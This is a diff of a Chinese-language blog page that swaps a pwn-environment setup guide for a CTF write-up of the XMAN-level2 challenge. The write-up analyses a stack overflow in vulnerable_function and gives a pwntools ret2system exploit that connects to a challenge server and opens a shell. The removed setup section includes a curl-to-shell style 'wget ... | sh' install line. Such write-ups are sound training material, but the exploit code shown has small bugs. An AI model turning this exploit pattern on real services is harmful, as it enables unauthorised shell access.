@@ -6,22 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>pwn环境配置 | Thriumph</title>
+  <title>XMAN-level2 | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简单记录一下pwn环境配置">
-<meta name="keywords" content="二进制安全">
+  <meta name="description" content="一道简单的rop">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn环境配置">
-<meta property="og:url" content="https://thriumph.top/pwn环境配置.html">
+<meta property="og:title" content="XMAN-level2">
+<meta property="og:url" content="https://thriumph.top/XMAN-level2.html">
 <meta property="og:site_name" content="Thriumph">
-<meta property="og:description" content="简单记录一下pwn环境配置">
+<meta property="og:description" content="一道简单的rop">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://thriumph.top/pwn环境配置/1.png">
-<meta property="og:updated_time" content="2019-09-21T10:44:20.984Z">
+<meta property="og:image" content="https://thriumph.top/XMAN-level2/1.png">
+<meta property="og:image" content="https://thriumph.top/XMAN-level2/2.png">
+<meta property="og:image" content="https://thriumph.top/XMAN-level2/3.png">
+<meta property="og:updated_time" content="2019-10-21T03:32:41.361Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn环境配置">
-<meta name="twitter:description" content="简单记录一下pwn环境配置">
-<meta name="twitter:image" content="https://thriumph.top/pwn环境配置/1.png">
+<meta name="twitter:title" content="XMAN-level2">
+<meta name="twitter:description" content="一道简单的rop">
+<meta name="twitter:image" content="https://thriumph.top/XMAN-level2/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -159,14 +161,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-pwn环境配置" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-XMAN-level2" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      pwn环境配置
+      XMAN-level2
     </h1>
   
 
@@ -186,51 +188,27 @@
 
 
         
-        <a href="/pwn环境配置.html" class="archive-article-date">
-  	<time datetime="2019-08-12T12:32:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-12</time>
+        <a href="/XMAN-level2.html" class="archive-article-date">
+  	<time datetime="2019-10-21T02:47:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简单记录一下pwn环境配置</p>
+        <p>一道简单的rop</p>
 <a id="more"></a>
-<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+<h1 id="查看保护机制"><a href="#查看保护机制" class="headerlink" title="查看保护机制"></a>查看保护机制</h1><p><img src="/XMAN-level2/1.png" alt><br>只开启了NX保护</p>
+<h1 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h1><p><strong>main函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .pip</span><br><span class="line">cd .pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure>
+<p><strong>vulnerable_function()函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>pip.conf.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">trusted-host =  mirrors.aliyun.com</span><br><span class="line">index-url = https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure>
+<p><strong>查看system函数</strong><br><img src="/XMAN-level2/2.png" alt><br>system函数的地址是0x08048320<br>system()函数没有直接输入”/bin/sh”<br>查找到有”/bin/sh”,地址是 0x0804a024<br><img src="/XMAN-level2/3.png" alt></p>
+<p>vulnerable_function()函数存在溢出, buf的长度为0x88，可以输入0x200的长度,可以在system()后面添加”/bin/sh”的地址，然后构造payload在buf后面调用系统函数得到shell</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'34085'</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048320</span></span><br><span class="line"><span class="comment">#sys_addr=elf.symbols['system'] 获取系统函数地址</span></span><br><span class="line">sh_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#sh_addr=elf.search('/bin/sh').next() 获取'/bin/sh'字符串地址</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment">#填充垃圾数据</span></span><br><span class="line">payload+=p32(sys_addr) <span class="comment">#覆盖返回地址到system函数pay	payload+=p32(66666) #随意填写system函数调用后的返回地址</span></span><br><span class="line">payload+=p32(<span class="number">0x0804a024</span>) <span class="comment">#system函数的参数，指向“/bin/sh”，实现调用</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="安装git和pip"><a href="#安装git和pip" class="headerlink" title="安装git和pip"></a>安装git和pip</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt‐get install git</span><br><span class="line">sudo apt install python‐pip </span><br><span class="line">python2 ‐m pip install ‐‐upgrade pip</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装Capstone（反编译框架）"><a href="#安装Capstone（反编译框架）" class="headerlink" title="安装Capstone（反编译框架）"></a>安装Capstone（反编译框架）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装Binutils（二进制工具集）"><a href="#安装Binutils（二进制工具集）" class="headerlink" title="安装Binutils（二进制工具集）"></a>安装Binutils（二进制工具集）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools-binutils</span><br><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo apt-add-repository ppa:pwntools/binutils</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install binutils-arm-linux-gnu</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装第三方库"><a href="#安装第三方库" class="headerlink" title="安装第三方库"></a>安装第三方库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install pwntools</span><br><span class="line">sudo pip install zio</span><br><span class="line">sudo pip install pwn</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python-dev libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntool</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装Pwndbg"><a href="#安装Pwndbg" class="headerlink" title="安装Pwndbg"></a>安装Pwndbg</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装gef"><a href="#安装gef" class="headerlink" title="安装gef"></a>安装gef</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh</span><br><span class="line"></span><br><span class="line">wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py</span><br><span class="line"></span><br><span class="line">echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby</span><br><span class="line">apt-get install gem</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
-
-<h1 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/libc.git</span><br><span class="line">cd libc</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">sudo python setup.py develop</span><br></pre></td></tr></table></figure>
-
-<h1 id="32位库安装"><a href="#32位库安装" class="headerlink" title="32位库安装"></a>32位库安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libc6‐dev‐i386 </span><br><span class="line">sudo apt‐get install lib32z1</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装libcdatabase"><a href="#安装libcdatabase" class="headerlink" title="安装libcdatabase"></a>安装libcdatabase</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/niklasb/</span><br><span class="line">libc-database.git</span><br><span class="line">cd libc-database</span><br><span class="line">./get</span><br></pre></td></tr></table></figure>
-
-<h1 id="pwndbg-def-peda切换"><a href="#pwndbg-def-peda切换" class="headerlink" title="pwndbg,def,peda切换"></a>pwndbg,def,peda切换</h1><p>更改~/.gdbinit文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">define init-peda</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">end</span><br><span class="line">document init-peda</span><br><span class="line">Initializes the PEDA (Python Exploit Development Assistant for GDB) framework</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-pwndbg</span><br><span class="line"># 此处为pwndbg的gdbinit.py的目录</span><br><span class="line">source /home/Thriumph/pwndbg/gdbinit.py</span><br><span class="line">end</span><br><span class="line">document init-pwndbg</span><br><span class="line">Initializes the PwnDBG</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-gef</span><br><span class="line">source /home/Thriumph/.gdbinit-gef.py</span><br><span class="line">end</span><br><span class="line">document init-gef</span><br><span class="line">Initializes the Gef</span><br><span class="line">end</span><br><span class="line">~</span><br></pre></td></tr></table></figure>
-
-<p>创建/bin/gdb-peda和/bin/pwndbg和/bin/gef<br><img src="/pwn环境配置/1.png" alt></p>
 
       
       
@@ -265,7 +243,7 @@
           
           <br>
           <strong>本文链接：</strong>
-          https://thriumph.top/pwn环境配置.html
+          https://thriumph.top/XMAN-level2.html
           <br>
           <strong>版权声明：</strong>
           本作品采用
@@ -290,7 +268,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -346,7 +328,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//pwn环境配置.html" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//XMAN-level2.html" alt="微信分享二维码">
     </div>
 </div>
 
@@ -360,18 +342,9 @@
   
 <nav id="article-nav">
   
-    <a href="/gdb常用命令.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          gdb常用命令
-        
-      </div>
-    </a>
   
-  
-    <a href="/栈帧.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">栈帧</div>
+    <a href="/XMan-level0.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XMan-level0</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -398,7 +371,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#安装vim"><span class="toc-number">1.</span> <span class="toc-text">安装vim</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pip换源"><span class="toc-number">2.</span> <span class="toc-text">pip换源</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装git和pip"><span class="toc-number">3.</span> <span class="toc-text">安装git和pip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装Capstone（反编译框架）"><span class="toc-number">4.</span> <span class="toc-text">安装Capstone（反编译框架）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装Binutils（二进制工具集）"><span class="toc-number">5.</span> <span class="toc-text">安装Binutils（二进制工具集）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装第三方库"><span class="toc-number">6.</span> <span class="toc-text">安装第三方库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装pwntools"><span class="toc-number">7.</span> <span class="toc-text">安装pwntools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装peda"><span class="toc-number">8.</span> <span class="toc-text">安装peda</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装Pwndbg"><span class="toc-number">9.</span> <span class="toc-text">安装Pwndbg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装gef"><span class="toc-number">10.</span> <span class="toc-text">安装gef</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装one-gadget"><span class="toc-number">11.</span> <span class="toc-text">安装one_gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LibcSearcher"><span class="toc-number">12.</span> <span class="toc-text">LibcSearcher</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#32位库安装"><span class="toc-number">13.</span> <span class="toc-text">32位库安装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安装libcdatabase"><span class="toc-number">14.</span> <span class="toc-text">安装libcdatabase</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwndbg-def-peda切换"><span class="toc-number">15.</span> <span class="toc-text">pwndbg,def,peda切换</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#查看保护机制"><span class="toc-number">1.</span> <span class="toc-text">查看保护机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ida分析"><span class="toc-number">2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
                     </div>
                 </span>
             </div>
